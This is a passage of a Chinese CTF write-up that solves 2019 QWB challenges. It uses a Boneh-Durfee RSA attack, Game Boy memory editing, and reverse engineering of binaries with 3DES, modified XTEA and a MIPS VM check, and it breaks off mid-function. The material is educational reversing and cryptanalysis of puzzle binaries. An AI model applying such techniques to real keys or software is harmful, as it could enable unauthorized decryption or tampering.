</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h3 id="第六层"><a href="#第六层" class="header-anchor">#</a> 第六层</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token builtin">hex</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>Boneh and Durfee attack，使用<a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener noreferrer">https://github.com/mimoo/RSA-and-LLL-attacks<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>上脚本即可</p> <h3 id="参考链接"><a href="#参考链接" class="header-anchor">#</a> 参考链接</h3> <p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1" target="_blank" rel="noopener noreferrer">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener noreferrer">https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener noreferrer">https://sagecell.sagemath.org/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="https://github.com/maojui/Cytro" target="_blank" rel="noopener noreferrer">https://github.com/maojui/Cytro<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="鲲or鳗orgame"><a href="#鲲or鳗orgame" class="header-anchor">#</a> 鲲or鳗orGame</h2> <p>先从游戏页面的 mobile.js 里找到游戏源文件<code>rom/game.gb</code>，linux 上下一个模拟器，这里用的是 mgba-qt，用它带的 memory search 搜索游戏分数，定位到地址 dfdd</p> <p><img src="/assets/img/2019-qwb-game1.944c415c.png" alt="memory search"></p> <p>在游戏开始的时候 ctrl+p 暂停游戏，更改 dfdd 改为 FF，自杀再玩一次拿到 flag</p> <p><img src="/assets/img/2019-qwb-game2.d124128e.png" alt="memory viewer"></p> <p><img src="/assets/img/2019-qwb-game3.adb67535.png" alt="flag"></p> <h2 id="justre"><a href="#justre" class="header-anchor">#</a> JustRe</h2> <h3 id="太长不看"><a href="#太长不看" class="header-anchor">#</a> 太长不看</h3> <p>输入，过两个检查函数，输出输入的 flag。第一个检查是一个线性函数，爆破位数较小的参数，第二个检查是 3DES 解密之后逐字节比较。</p> <h3 id="check1"><a href="#check1" class="header-anchor">#</a> check1</h3> <p>输入的前八字符判断是否属于[0-9A-Z]然后按照 16 进制读取成 4 字节，然后重复四次，放入 xmm 变量 part1，这里其实存在一个漏洞，如果输入的字符在[G-Z]之间，实际上导致了多解。</p> <p><img src="/assets/img/2019-qwb-re1.36dacfa2.jpg" alt=""></p> <p><img src="/assets/img/2019-qwb-re2.a6c15542.jpg" alt=""></p> <p>之后是一段和前面比较相似的流程，将(输入 flag 的第九字节的 ascii 码乘上 16)加上(第十字节按 16 进制解释)，得到的值截取一字节，重复 16 次，放入 xmm 变量 part2</p> <p><img src="/assets/img/2019-qwb-re3.73a61c69.jpg" alt=""></p> <p>然后是一段运算，这里使用的 4053C4 这个量来自于库函数写入的全局变量，推测是和 cpu 对于 sse 指令集的支持有关，观察这段指令，如果执行了 if 块中的内容，从 Buffer 地址开始的 4 个 128 位的部分会被写入，然后循环变量 v20 会被设置为 24，v20 在 i32 数组中用作下标，所以</p> <blockquote><p>4*(128/8)==16*4(sizeof i32)</p></blockquote> <p>也就是说此处 if 块中的操作应该与下方 dowhile 的完全相同，那么从比较清晰的 dowhile 来看，这里是将前面流程 flag 第一部分算出的四字节量、第二部分算出的一字节量、当前循环轮数和一个常量数组进行了线性运算，再往下的流程里对运算的结果和一个常量数组进行了逐位比较，所以这里的目标就是让运算结果和常量数组一致。
这里因为每个方程里有两个未知数，其中一个是只有一字节的，所以可以爆破</p> <div class="language-C line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> i0 <span class="token operator">=</span> <span class="token number">0x79B19266</span><span class="token punctuation">;</span><span class="token keyword">int</span> o0 <span class="token operator">=</span> <span class="token number">0x83EC8B55</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> i1 <span class="token operator">=</span> <span class="token number">0xE88EBBB6</span><span class="token punctuation">;</span><span class="token keyword">int</span> o1 <span class="token operator">=</span> <span class="token number">0xEC81F0E4</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0xFC0D093B</span><span class="token punctuation">;</span><span class="token keyword">int</span> o2 <span class="token operator">=</span> <span class="token number">0x00000278</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">;</span> j <span class="token operator">!=</span> <span class="token number">128</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   	<span class="token keyword">int</span> flag <span class="token operator">=</span> o0 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x01010101</span> <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> i0<span class="token punctuation">)</span><span class="token punctuation">;</span>
   	<span class="token keyword">if</span> <span class="token punctuation">(</span>o1 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">0x01010101</span> <span class="token operator">*</span> j <span class="token operator">+</span> i1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    	<span class="token operator">&amp;&amp;</span> o2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">0x01010101</span> <span class="token operator">*</span> j <span class="token operator">+</span> i2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   		cout <span class="token operator">&lt;&lt;</span> flag <span class="token operator">&lt;&lt;</span><span class="token char">' '</span><span class="token operator">&lt;&lt;</span>j<span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>跑出一组，按照前面分析的对应关系还原成 flag 即可。
过了 check 有个奇怪的<code>xor eax, eax; mov [eax], eax;</code> 会尝试写 0 地址，几乎必定导致程序崩溃，patch 掉它就好，然后会把之前的常量数组写到 check2 的开头，但是和 check2 原有的代码没有差别，所以估计是忘改了？</p> <h3 id="check2"><a href="#check2" class="header-anchor">#</a> check2</h3> <p>开头给了一个奇怪的可见字符串，长度 24。初始化了一些空间，然后把这个 24 的字符串每 8 字符(和三块不同空间)分别调用了同一个函数。然后将 flag 从 10 开始的部分复制到一个新空间，<code>v2 = strlen(flag_part);memset(&amp;Dst[v2], (8 - v2 % 8), 8 - v2 % 8);</code> 非常像是 PKCSpadding。
之后，以八字节为单位，对 padding 后的 flag 和之前生成的三个空间进行了一些运算。运算中出现了 0x3333 0x5555 0xF0F0 这样的对特定位取值的魔数。同时有一个这样的调用-&gt;</p> <p><img src="/assets/img/2019-qwb-re4.355f31d7.jpg" alt=""></p> <p>(注：这个库是打过 patch 的，原来这里的调用是 101 加解加 对应的是加密过程)
这就比较像 3DES 了，然后搜索魔数确定算法确实是 3DES。接下来两条路，</p> <ol><li>修改 3DES 三次调用加密变解密
<ul><li>加密流程：加密(key0);解密(key1);加密(Key2);</li> <li>解密流程：解密(key2);加密(key1);解密(Key0);</li></ul></li> <li>网上找个 3DES 解密工具先试试,结果直接出来了,将两部分拼起来即为 flag。</li></ol> <h2 id="webassembly"><a href="#webassembly" class="header-anchor">#</a> Webassembly</h2> <h3 id="太长不看-2"><a href="#太长不看-2" class="header-anchor">#</a> 太长不看</h3> <p>js 上的 WebAssembly，XTEA 加密后逐字节比较。IDA 牛逼!!!</p> <h3 id="main"><a href="#main" class="header-anchor">#</a> _main</h3> <div class="language-C line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//略去一些内容</span>
  <span class="token function">f54</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//动调发现这个函数做了输入</span>
  g7 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
  <span class="token function">f15</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//结果的输出在这个函数里，所以猜测判断在这里</span>
  g7 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token operator">--</span>wasm_rt_call_stack_depth<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="f15"><a href="#f15" class="header-anchor">#</a> f15</h3> <p>函数中有几个下面这样的片段,而且多次地对 V54 这个恒为 0 的数组做取值，猜测是某种常见的加密算法。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>v43 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
v39 <span class="token operator">=</span> <span class="token function">i32_load</span><span class="token punctuation">(</span>Z_envZ_memory<span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//相当于 v39=*(int *)(((char *)a1)+12);</span>
v47 <span class="token operator">=</span> <span class="token function">i32_load</span><span class="token punctuation">(</span>Z_envZ_memory<span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从wasm转换成c代码导致的</span>
v50 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">do</span>
<span class="token punctuation">{</span>
    v47 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">i32_load</span><span class="token punctuation">(</span>Z_envZ_memory<span class="token punctuation">,</span> v54 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v43 <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v43<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v39 <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">16</span> <span class="token operator">*</span> v39<span class="token punctuation">)</span> <span class="token operator">+</span> v39<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v43 <span class="token operator">-=</span> <span class="token number">0x61C88647</span><span class="token punctuation">;</span><span class="token comment">//魔数</span>
    v39 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">i32_load</span><span class="token punctuation">(</span>Z_envZ_memory<span class="token punctuation">,</span> v54 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v43 <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v43<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v47 <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">16</span> <span class="token operator">*</span> v47<span class="token punctuation">)</span><span class="token operator">+</span> v47<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">++</span>v50<span class="token punctuation">;</span><span class="token comment">//循环变量</span>
<span class="token punctuation">}</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span> v50 <span class="token operator">!=</span> <span class="token number">32</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>又做了一些搜索之后(搜索了移位的常量 5 11)，我找到了这个：XTEA 算法</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">encipher</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> delta<span class="token operator">=</span><span class="token number">0x9E3779B9</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        v0 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>
        v1 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">&gt;&gt;</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>然后就是解密了，因为这次修改了算法的魔数，所以网上找解密工具是没用了，找份源码改掉魔数试试。</p> <p><img src="/assets/img/2019-qwb-re5.e818a51e.jpg" alt=""></p> <h2 id="设备固件"><a href="#设备固件" class="header-anchor">#</a> 设备固件</h2> <h3 id="太长不看-3"><a href="#太长不看-3" class="header-anchor">#</a> 太长不看</h3> <p>mips 架构，两个检查函数，第一个是简单的比较，第二个里面是个 vm，指令集只有取数据、简单运算、比较和跳转，检查逻辑大约相当于： <code>Const[i]=(((0x10&lt;&lt;8)+0x24+((i)*(i+1))/2)*flag[i])&gt;&gt;6</code></p> <h3 id="main-2"><a href="#main-2" class="header-anchor">#</a> main</h3> <p>输入用户名密码，分别存在同一个 0x50 的前后 0x28 空间中</p> <h3 id="chk1"><a href="#chk1" class="header-anchor">#</a> chk1</h3> <div class="language-C line-numbers-mode"><pre class="language-c"><code>uint <span class="token function">chk1</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>pcParm1<span class="token punctuation">)</span><span class="token comment">//输入字符串</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> cVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar3<span class="token punctuation">;</span>
  iVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcParm1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x32U</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcParm1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">99U</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcParm1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x65U</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcParm1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x65U</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>pcParm1 <span class="token operator">^</span> <span class="token number">0x30U</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//逐位异或结果求和</span>
  pcVar3 <span class="token operator">=</span> pcParm1 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token comment">//第字符6开始</span>
  <span class="token keyword">do</span> <span class="token punctuation">{</span>
    cVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>pcVar3<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iVar2 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>cVar1<span class="token punctuation">;</span><span class="token comment">//加到比较变量上</span>
  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>pcVar3 <span class="token operator">!=</span> pcParm1 <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等于缓冲区长度</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//结果是0所以所有加的数都是零。</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="chk2"><a href="#chk2" class="header-anchor">#</a> chk2</h3> <div class="language-C line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">chk2</span><span class="token punctuation">(</span><span class="token keyword">int</span> iParm1<span class="token punctuation">)</span><span class="token comment">//还是传入的字符串</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>arr<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>const_ARR<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_pass<span class="token punctuation">;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>tran_const<span class="token punctuation">;</span>
  <span class="token keyword">short</span> <span class="token operator">*</span>tran_pass<span class="token punctuation">;</span>
  <span class="token keyword">int</span> uVar2<span class="token punctuation">;</span>
  arr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保存了虚拟状态</span>
  const_ARR <span class="token operator">=</span> null_ARRAY_00411040<span class="token punctuation">;</span><span class="token comment">//指向地址0x411040的int[32]数组</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>arr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  _pass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>iParm1 <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指向输入的密码 实际长度只有32</span>
